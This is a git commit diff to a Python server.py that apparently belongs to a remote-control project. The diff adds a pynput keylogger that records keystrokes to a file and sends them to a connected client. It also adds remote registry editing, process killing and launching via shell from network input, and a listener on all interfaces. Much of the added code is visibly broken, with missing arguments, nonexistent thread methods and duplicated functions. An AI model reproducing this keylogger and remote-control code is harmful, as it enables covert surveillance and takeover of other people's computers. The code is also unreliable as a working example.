6e4611af6a5fb0d990177cb38430700ce35bb980
pililover <nkanh22@clc.fitus.edu.vn>
2023-08-11 13:49:19 +0700

    Update server.py

--- server.py
+++ server.py
@@ -10,6 +10,11 @@ import os
 import subprocess
 import sys
 from PyQt6.QtWidgets import QApplication, QWidget, QPushButton
+import winreg
+import psutil
+from ipaddress import ip_address
+from contextlib import closing
+import pynput.keyboard
 
 HOST = "127.0.1.1"
 PORT = 64444
@@ -21,10 +26,47 @@ LOGOUT = "logout"
 EXIT = "exit"
 
 
+class KeyLogger:
+    @staticmethod
+    def startKLog():
+        # Implement your keylogging logic here
+        def on_key_release(key):
+            with open(AppStart.path, "a") as file:
+                file.write(str(key) + '\n')
+
+        with pynput.keyboard.Listener(on_key_release=on_key_release) as listener:
+            listener.join()
+
+
+class AppStart:
+    path = "logfile.txt"  # Update this with the appropriate file path
+
+
+class NetworkConnection:
+    def __init__(self, host, port):
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.connect((host, port))
+        self.buffer = ""
+
+    def write(self, data):
+        self.buffer += data
+
+    def flush(self):
+        self.sock.sendall(self.buffer.encode('utf-8'))
+        self.buffer = ""
+
+    def receive(self, size):
+        return self.sock.recv(size).decode('utf-8')
+
+    def close(self):
+        self.sock.close()
+
+
 class Server:
     def __init__(self):
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.clients = []
+        self.nw = NetworkConnection()
 
     def start(self):
         try:
@@ -49,16 +91,16 @@ class Server:
             while True:
                 option = conn.recv(1024).decode("utf8")
                 print("Client option: " + option)
-                if option == LOGIN:
+                if option == "LOGIN":
                     conn.sendall(bytes("Login success", "utf8"))
 
-                elif option == REGISTER:
+                elif option == "REGISTER":
                     conn.sendall(bytes("Register success", "utf8"))
 
-                elif option == LOGOUT:
+                elif option == "LOGOUT":
                     conn.sendall(bytes("Logout success", "utf8"))
 
-                elif option == EXIT:
+                elif option == "EXIT":
                     conn.sendall(bytes("Exit success", "utf8"))
                     break
                 elif option == "TAKEPIC":
@@ -78,7 +120,7 @@ class Server:
             conn.close()
             self.clients.remove(conn)
 
-    def PCRegistryKey(self, conn):  # Renamed function
+    def PCRegistryKey(self, conn):
         try:
             s = conn.recv(4092).decode("utf8")
 
@@ -94,7 +136,7 @@ class Server:
                 res = self.PCSetValue(
                     base_key, link, value_name, value, value_type)
 
-            conn.sendall(bytes(res, "utf8"))  # Directly send response
+            conn.sendall(bytes(res, "utf8"))
         except Exception as ex:
             conn.sendall(bytes("Error: " + str(ex), "utf8"))
 
@@ -188,26 +230,271 @@ class Server:
 
     def pc_registry(self, conn):
         try:
-            self = conn.recv(4092).decode("utf8")
+            data = conn.recv(4092).decode("utf8")
 
             # Parse the received data to get base_key, link, value_name, value, and value_type
             # Format of data: "<base_key>;<link>;<value_name>;<value>;<value_type>"
-            base_key, link, value_name, value, value_type = self.split(";")
+            base_key, link, value_name, value, value_type = data.split(";")
 
             if value_type == "DELETE_VALUE":
-                res = Server.PCRemoveValue(base_key, link, value_name)
+                res = self.PCRemoveValue(base_key, link, value_name)
             elif value_type == "DELETE_KEY":
-                res = Server.PCRemoveKey(base_key, link)
+                res = self.PCRemoveKey(base_key, link)
             else:
-                res = Server.PCSetValue(
+                res = self.PCSetValue(
                     base_key, link, value_name, value, value_type)
 
-            Server.send_response(conn, res)
+            self.send_response(conn, res)
         except Exception as ex:
-            Server.send_response(conn, "Error: " + str(ex))
+            self.send_response(conn, "Error: " + str(ex))
 
     def send_response(self, conn, response):
         conn.sendall(bytes(response, "utf8"))
+
+    def delete_value(base_key, link, value_name):
+        try:
+            with winreg.OpenKey(base_key, link, 0, winreg.KEY_SET_VALUE) as key:
+                winreg.DeleteValue(key, value_name)
+                return "Value deleted successfully"
+        except Exception as ex:
+            return "Error: " + str(ex)
+
+    def delete_key(base_key, link):
+        try:
+            winreg.DeleteKey(base_key, link)
+            return "Key deleted successfully"
+        except Exception as ex:
+            return "Error: " + str(ex)
+
+    def send_response(self, conn, response):
+        conn.sendall(bytes(response, "utf8"))
+
+    def base_registry_key(self, link):
+        base_key = None
+        if "\\" in link:
+            if link.startswith("HKEY_CLASSES_ROOT"):
+                base_key = winreg.HKEY_CLASSES_ROOT
+            elif link.startswith("HKEY_CURRENT_USER"):
+                base_key = winreg.HKEY_CURRENT_USER
+            elif link.startswith("HKEY_LOCAL_MACHINE"):
+                base_key = winreg.HKEY_LOCAL_MACHINE
+            elif link.startswith("HKEY_USERS"):
+                base_key = winreg.HKEY_USERS
+            elif link.startswith("HKEY_CURRENT_CONFIG"):
+                base_key = winreg.HKEY_CURRENT_CONFIG
+        return base_key
+
+    def registry(self, conn):
+        while True:
+            data = conn.recv(4092).decode("utf8")
+            if data == "QUIT":
+                return
+            elif data == "SEND":
+                option = conn.recv(1024).decode("utf8")
+                link = conn.recv(1024).decode("utf8")
+                value_name = conn.recv(1024).decode("utf8")
+                value = conn.recv(1024).decode("utf8")
+                value_type = conn.recv(1024).decode("utf8")
+                base_key = self.base_registry_key(link)
+                link2 = link[link.index("\\")+1:]
+                if base_key is None:
+                    res = "Error"
+                else:
+                    if option == "Create key":
+                        base_key.CreateSubKey(link2)
+                        res = "Key created successfully"
+                    elif option == "Delete key":
+                        res = self.PCRemoveKey(base_key, link2)
+                    elif option == "Get value":
+                        res = self.PCGetValue(base_key, link2, value_name)
+                    elif option == "Set value":
+                        res = self.PCSetValue(
+                            base_key, link2, value_name, value, value_type)
+                    elif option == "Delete value":
+                        res = self.PCRemoveValue(base_key, link2, value_name)
+                    else:
+                        res = "Error"
+                self.send_response(conn, res)
+
+    def hookKey(self):
+        self.tklog.resume()
+        open(AppStart.path, "w").close()
+
+    def unhook(self):
+        self.tklog.suspend()
+
+    def printkeys(self):
+        s = ""
+        with open(AppStart.path, "r") as file:
+            s = file.read()
+        open(AppStart.path, "w").close()
+        if not s:
+            s = "\0"
+        self.nw.write(s)
+        self.nw.flush()
+
+    def keylog(self):
+        self.tklog = threading.Thread(target=KeyLogger.startKLog)
+        s = ""
+        self.tklog.start()
+        self.tklog.suspend()
+        while True:
+            s = self.receiveSignal()
+            if s == "PRINT":
+                self.printkeys()
+            elif s == "HOOK":
+                self.hookKey()
+            elif s == "UNHOOK":
+                self.unhook()
+            elif s == "QUIT":
+                return
+
+    def receiveSignal(self):
+        try:
+            # Assuming you send a 4-byte signal size first
+            signal_size = int(self.nw.receive(4))
+            signal_data = self.nw.receive(signal_size)
+            return signal_data.decode("utf-8")
+        except Exception as e:
+            print("Error receiving signal:", str(e))
+            return ""
+
+    def application(self):
+        while True:
+            ss = self.receiveSignal()
+            if ss == "XEM":
+                pr = psutil.process_iter(
+                    ['pid', 'name', 'num_threads', 'num_handles', 'memory_info'])
+                self.nw.write(str(len(list(pr))) + "\n")
+                for p in pr:
+                    try:
+                        if p.info['name'] and p.info['name'] != "":
+                            self.nw.write("ok\n")
+                            self.nw.write(p.info['name'] + "\n")
+                            self.nw.write(str(p.info['pid']) + "\n")
+                            self.nw.write(str(p.info['num_threads']) + "\n")
+                            self.nw.flush()
+                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                        pass
+
+            elif ss == "KILL":
+                while True:
+                    ss = self.receiveSignal()
+                    if ss == "KILLID":
+                        u = self.receive()
+                        test2 = False
+                        if u:
+                            try:
+                                process = psutil.Process(int(u))
+                                process.terminate()
+                                self.nw.write("Đã diệt chương trình\n")
+                                self.nw.flush()
+                                test2 = True
+                            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                                pass
+
+                        if not test2:
+                            self.nw.write("Không tìm thấy chương trình\n")
+                            self.nw.flush()
+                    elif ss == "QUIT":
+                        break
+
+            elif ss == "START":
+                while True:
+                    ss = self.receiveSignal()
+                    if ss == "STARTID":
+                        u = self.receive()
+                        if u:
+                            u += ".exe"
+                            try:
+                                subprocess.Popen(u, shell=True)
+                                self.nw.write("Chương trình đã được bật\n")
+                                self.nw.flush()
+                            except Exception as ex:
+                                self.nw.write("Lỗi\n")
+                                self.nw.flush()
+                        else:
+                            self.nw.write("Lỗi\n")
+                            self.nw.flush()
+                    elif ss == "QUIT":
+                        break
+
+            elif ss == "QUIT":
+                return
+
+    def process(conn):
+        while True:
+            data = conn.recv(4092).decode("utf8")
+            if data == "QUIT":
+                return
+            elif data == "XEM":
+                processes = subprocess.check_output(
+                    ['wmic', 'process', 'get', 'name,processid']).decode().split("\r\r\n")
+                conn.sendall(bytes(str(len(processes)), "utf8"))
+                for process in processes:
+                    name, pid = process.split()
+                    conn.sendall(bytes(name, "utf8"))
+                    conn.sendall(bytes(pid, "utf8"))
+            elif data == "KILL":
+                while True:
+                    option = conn.recv(1024).decode("utf8")
+                    if option == "KILLID":
+                        pid = conn.recv(1024).decode("utf8")
+                        try:
+                            os.kill(int(pid), 9)
+                            conn.sendall(bytes("Process killed", "utf8"))
+                        except Exception as ex:
+                            conn.sendall(bytes("Error", "utf8"))
+                    elif option == "QUIT":
+                        break
+            elif data == "START":
+                while True:
+                    option = conn.recv(1024).decode("utf8")
+                    if option == "STARTID":
+                        name = conn.recv(1024).decode("utf8")
+                        if name != "":
+                            name += ".exe"
+                            try:
+                                subprocess.Popen(name)
+                                conn.sendall(
+                                    bytes("Process started successfully", "utf8"))
+                            except Exception as ex:
+                                conn.sendall(bytes("Error", "utf8"))
+                    elif option == "QUIT":
+                        break
+
+    def button1_Click(self):
+        ip = "0.0.0.0"
+        port = 5656
+
+        with closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as server:
+            server.bind((ip, port))
+            server.listen(100)
+
+            client, _ = server.accept()
+            ns = client.makefile('rwb')
+            self.nr = ns
+            self.nw = ns
+
+            while True:
+                s = self.receiveSignal()
+                if s == "KEYLOG":
+                    self.keylog()
+                elif s == "SHUTDOWN":
+                    self.shutdown()
+                elif s == "REGISTRY":
+                    self.registry()
+                elif s == "TAKEPIC":
+                    self.takepic()
+                elif s == "PROCESS":
+                    self.process()
+                elif s == "APPLICATION":
+                    self.application()
+                elif s == "QUIT":
+                    break
+
+        client.shutdown(socket.SHUT_RDWR)
+        client.close()
 
 
 class ServerGUI(QWidget):
